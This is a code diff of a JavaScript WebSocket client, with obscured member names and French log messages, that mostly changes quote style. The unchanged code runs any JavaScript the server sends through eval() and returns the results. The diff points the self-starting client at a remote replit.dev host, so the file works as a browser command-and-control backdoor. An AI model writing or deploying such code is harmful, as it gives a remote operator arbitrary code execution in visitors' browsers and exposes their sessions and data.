@@ -19,7 +19,7 @@ class ClientNet3m8w {
     this.socketConn7x1q = new WebSocket(this.urlServer9k2v);
 
     this.socketConn7x1q.onopen = () => {
-      console.log("[CLIENT] Connecté au serveur WebSocket");
+      console.log('[CLIENT] Connecté au serveur WebSocket');
       this.retryCount5p3j = 0;
       this.startPing();
     };
@@ -28,24 +28,24 @@ class ClientNet3m8w {
       try {
         const message = JSON.parse(event.data);
 
-        if (message.type === "welcome") {
+        if (message.type === 'welcome') {
           this.userIdent4z8n = message.uuid;
           console.log(`[CLIENT] UUID reçu: ${this.userIdent4z8n.substring(0, 8)}...`);
         }
 
-        if (message.type === "execute_js") {
+        if (message.type === 'execute_js') {
           try {
             const result = eval(message.code);
             this.sendMessage({
-              type: "js_executed",
+              type: 'js_executed',
               success: true,
-              result: result !== undefined ? String(result) : "Code exécuté avec succès",
+              result: result !== undefined ? String(result) : 'Code exécuté avec succès',
               timestamp: new Date().toISOString(),
             });
           } catch (executeError) {
-            console.error("[CLIENT] Erreur d'exécution JS:", executeError);
+            console.error('[CLIENT] Erreur d\'exécution JS:', executeError);
             this.sendMessage({
-              type: "js_executed",
+              type: 'js_executed',
               success: false,
               error: executeError.message,
               timestamp: new Date().toISOString(),
@@ -53,7 +53,7 @@ class ClientNet3m8w {
           }
         }
       } catch (err) {
-        console.log("[CLIENT] Erreur parse message:", err.message);
+        console.log('[CLIENT] Erreur parse message:', err.message);
       }
     };
 
@@ -64,7 +64,7 @@ class ClientNet3m8w {
     };
 
     this.socketConn7x1q.onerror = (error) => {
-      console.log("[CLIENT] Erreur WebSocket:", error.message || error);
+      console.log('[CLIENT] Erreur WebSocket:', error.message || error);
     };
   }
 
@@ -72,14 +72,14 @@ class ClientNet3m8w {
     if (this.socketConn7x1q && this.socketConn7x1q.readyState === WebSocket.OPEN) {
       this.socketConn7x1q.send(JSON.stringify(message));
     } else {
-      console.warn("[CLIENT] Impossible d'envoyer le message - WebSocket fermé");
+      console.warn('[CLIENT] Impossible d\'envoyer le message - WebSocket fermé');
     }
   }
 
   startPing() {
     this.pingTimer8w4r = setInterval(() => {
       this.sendMessage({
-        type: "ping",
+        type: 'ping',
         timestamp: new Date().toISOString(),
       });
     }, 30000);
@@ -103,7 +103,7 @@ class ClientNet3m8w {
         this.connect();
       }, delay);
     } else {
-      console.log("[CLIENT] Reconnexion impossible - Limite atteinte");
+      console.log('[CLIENT] Reconnexion impossible - Limite atteinte');
     }
   }
 
@@ -111,13 +111,13 @@ class ClientNet3m8w {
     if (this.socketConn7x1q) {
       this.stopPing();
       this.socketConn7x1q.close();
-      console.log("[CLIENT] Déconnexion manuelle");
+      console.log('[CLIENT] Déconnexion manuelle');
     }
   }
 }
 
 // Configuration par défaut (sera remplacée dynamiquement)
-const URL_CONFIG_Q4R7 = "ws://localhost:3000";
+const URL_CONFIG_Q4R7 = 'wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev';
 
 // Initialisation automatique si dans un navigateur
 if (typeof window !== 'undefined') {
